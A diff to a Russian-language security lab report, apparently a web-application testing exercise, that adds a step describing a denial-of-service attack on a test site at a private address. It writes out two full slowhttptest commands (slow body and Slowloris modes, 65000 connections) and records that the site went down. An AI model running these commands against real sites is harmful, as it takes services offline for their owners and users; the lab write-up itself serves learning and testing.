@@ -102,6 +102,19 @@
 
 ![](pic/ZAPalerts.jpg)
 
+8. Произвел DOS атаку на сайт:
+
+    > Для пущей надёжности сразу из двух консолей запуском команд:
+
+    > -B               slow body a.k.a R-U-Dead-Yet
+    
+        slowhttptest -c 65000 -B -i 10 -r 2000 -t GET -u http://10.0.0.10:8888 -x 24 -p 3
+    > -H               slow headers a.k.a. Slowloris (default)
+
+        slowhttptest -c 65000 -H -i 10 -r 2000 -t GET -u http://10.0.0.10:8888 -x 24 -p 3
+    >  Сайт становится недоступен даже после запуска любой из этих атак.
+
+![](pic/slowhttptest.jpg)
 
 ## Результаты сканирования 
 
